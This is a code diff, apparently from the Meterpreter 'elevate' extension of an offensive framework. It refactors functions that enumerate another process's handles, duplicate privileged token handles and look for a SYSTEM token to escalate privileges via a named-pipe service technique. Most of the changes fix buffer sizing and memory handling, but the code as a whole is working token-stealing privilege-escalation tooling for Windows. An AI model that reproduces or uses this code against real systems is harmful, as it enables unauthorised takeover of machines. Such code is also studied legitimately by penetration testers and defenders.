@@ -5,6 +5,7 @@
 #include "service.h"
 
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
+#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
 typedef NTSTATUS(WINAPI* NTQUERYINFORMATIONPROCESS)(HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
 typedef NTSTATUS(WINAPI* NTQUERYOBJECT)(HANDLE Handle, DWORD ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
 
@@ -82,11 +83,8 @@ DWORD get_token_object_index(PULONG TokenIndex)
 	HMODULE hNtdll = NULL;
 	NTQUERYOBJECT pNtQueryObject = NULL;
 	DWORD dwResult = ERROR_UNIDENTIFIED_ERROR;
-
-	struct {
-		OBJECT_TYPE_INFORMATION TypeInfo;
-		WCHAR TypeNameBuffer[sizeof("Token")];
-	} typeInfoWithName;
+	POBJECT_TYPE_INFORMATION pObjTypeInfo = NULL;
+	ULONG ulLength = 0;
 
 	do {
 		if (!OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &hToken)) {
@@ -103,15 +101,28 @@ DWORD get_token_object_index(PULONG TokenIndex)
 			BREAK_ON_ERROR("[ELEVATE] get_token_object_index. GetProcAddress(hNtdll, \"NtQueryObject\") failed");
 		}
 
-		status = pNtQueryObject(hToken, ObjectTypeInformation, &typeInfoWithName, sizeof(typeInfoWithName), NULL);
-		if (!NT_SUCCESS(status)) {
-			BREAK_WITH_ERROR("[ELEVATE] get_token_object_index. NtQueryObject failed", HRESULT_FROM_NT(status));
+		status = pNtQueryObject(hToken, ObjectTypeInformation, NULL, 0, &ulLength);
+		if (NT_SUCCESS(status)) {
+			BREAK_WITH_ERROR("[ELEVATE] get_token_object_index. NtQueryObject failed (1st call)", HRESULT_FROM_NT(status));
 		}
 
-		*TokenIndex = typeInfoWithName.TypeInfo.TypeIndex;
+		pObjTypeInfo = (POBJECT_TYPE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulLength);
+		if (pObjTypeInfo == NULL) {
+			BREAK_WITH_ERROR("[ELEVATE] get_token_object_index. HeapAlloc failed", ERROR_NOT_ENOUGH_MEMORY);
+		}
+
+		status = pNtQueryObject(hToken, ObjectTypeInformation, pObjTypeInfo, ulLength, NULL);
+		if (!NT_SUCCESS(status)) {
+			BREAK_WITH_ERROR("[ELEVATE] get_token_object_index. NtQueryObject failed (2nd call)", HRESULT_FROM_NT(status));
+		}
+
+		*TokenIndex = pObjTypeInfo->TypeIndex;
 		dwResult = ERROR_SUCCESS;
 	} while (0);
 
+	if (pObjTypeInfo) {
+		HeapFree(GetProcessHeap(), 0, pObjTypeInfo);
+	}
 	if (hToken) {
 		CloseHandle(hToken);
 	}
@@ -120,10 +131,9 @@ DWORD get_token_object_index(PULONG TokenIndex)
 
 DWORD get_system_token(HANDLE hProc, PHANDLE phToken)
 {
-	NTSTATUS status;
-	PROCESS_HANDLE_SNAPSHOT_INFORMATION localInfo;
-	PPROCESS_HANDLE_SNAPSHOT_INFORMATION handleInfo = &localInfo;
-	ULONG bytes;
+	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;;
+	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pHandleInfo = NULL;
+	ULONG ulLength = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION);
 	ULONG tokenIndex;
 	ULONG i;
 	DWORD dwResult = ERROR_UNIDENTIFIED_ERROR;
@@ -149,36 +159,46 @@ DWORD get_system_token(HANDLE hProc, PHANDLE phToken)
 			BREAK_ON_ERROR("[ELEVATE] get_system_token. GetProcAddress(hNtdll, \"NtQueryInformationProcess\") failed");
 		}
 
-		status = pNtQueryInformationProcess(hProc, ProcessHandleInformation, handleInfo, sizeof(*handleInfo), &bytes);
-		if (NT_SUCCESS(status)) {
-			BREAK_WITH_ERROR("[ELEVATE] get_system_token. NtQueryInformationProcess failed (1st call)", HRESULT_FROM_NT(status));
-		}
+		do {
+			ulLength += (sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO) * 16);
+			if (pHandleInfo) {
+				HeapFree(GetProcessHeap(), 0, pHandleInfo);
+				pHandleInfo = NULL;
+			}
+			pHandleInfo = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulLength);
+			if (pHandleInfo == NULL) {
+				BREAK_WITH_ERROR("[ELEVATE] get_system_token. HeapAlloc failed", ERROR_NOT_ENOUGH_MEMORY);
+			}
 
-		handleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytes);
-		if (handleInfo == NULL) {
-			BREAK_WITH_ERROR("[ELEVATE] get_system_token. get_token_object_index failed", ERROR_NOT_ENOUGH_MEMORY);
-		}
+			status = pNtQueryInformationProcess(hProc, ProcessHandleInformation, pHandleInfo, ulLength, &ulLength);
+			if (NT_SUCCESS(status)) {
+				break;
+			}
+			if (status == STATUS_INFO_LENGTH_MISMATCH) {
+				continue;
+			}
+			BREAK_WITH_ERROR("[ELEVATE] get_system_token. NtQueryInformationProcess failed", ERROR_UNIDENTIFIED_ERROR);
+		} while (status == STATUS_INFO_LENGTH_MISMATCH);
 
-		status = pNtQueryInformationProcess(hProc, ProcessHandleInformation, handleInfo, bytes, NULL);
 		if (!NT_SUCCESS(status)) {
-			BREAK_WITH_ERROR("[ELEVATE] get_system_token. NtQueryInformationProcess failed (2nd call)", HRESULT_FROM_NT(status));
+			BREAK_WITH_ERROR("[ELEVATE] get_system_token. failed to retrieve process handle information", ERROR_UNIDENTIFIED_ERROR);
 		}
 
-		for (i = 0; i < handleInfo->NumberOfHandles; i++) {
-			if (handleInfo->Handles[i].ObjectTypeIndex != tokenIndex) {
+		for (i = 0; i < pHandleInfo->NumberOfHandles; i++) {
+			if (pHandleInfo->Handles[i].ObjectTypeIndex != tokenIndex) {
 				continue;
 			}
 
 			// TODO: this 0xf01ff value needs to be examined...
-			if (handleInfo->Handles[i].GrantedAccess != 0xf01ff) {
+			if (pHandleInfo->Handles[i].GrantedAccess != 0xf01ff) {
 				continue;
 			}
 
-			if (!DuplicateHandle(hProc, handleInfo->Handles[i].HandleValue, GetCurrentProcess(), &hToken, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
+			if (!DuplicateHandle(hProc, pHandleInfo->Handles[i].HandleValue, GetCurrentProcess(), &hToken, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
 				CONTINUE_ON_ERROR("[ELEVATE] get_system_token. DuplicateHandle failed");
 			}
 
-			if (!GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &bytes)) {
+			if (!GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &ulLength)) {
 				CloseHandle(hToken);
 				CONTINUE_ON_ERROR("[ELEVATE] get_system_token. GetTokenInformation failed");
 			}
@@ -205,8 +225,8 @@ DWORD get_system_token(HANDLE hProc, PHANDLE phToken)
 		}
 	} while (0);
 
-	if (handleInfo != &localInfo) {
-		HeapFree(GetProcessHeap(), 0, handleInfo);
+	if (pHandleInfo) {
+		HeapFree(GetProcessHeap(), 0, pHandleInfo);
 	}
 	return dwResult;
 }
@@ -285,6 +305,7 @@ DWORD elevate_via_service_namedpipe_rpcss(Remote* remote, Packet* packet)
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: GetVersionEx failed")
 		}
 
+		// TODO: actually test this on XP / server 2003
 		// filter out systems older than Windows XP (5.1) for this technique
 		if ((os.dwMajorVersion < 5) || (os.dwMajorVersion == 5 && os.dwMinorVersion == 0)) {
 			SetLastError(ERROR_ACCESS_DENIED);
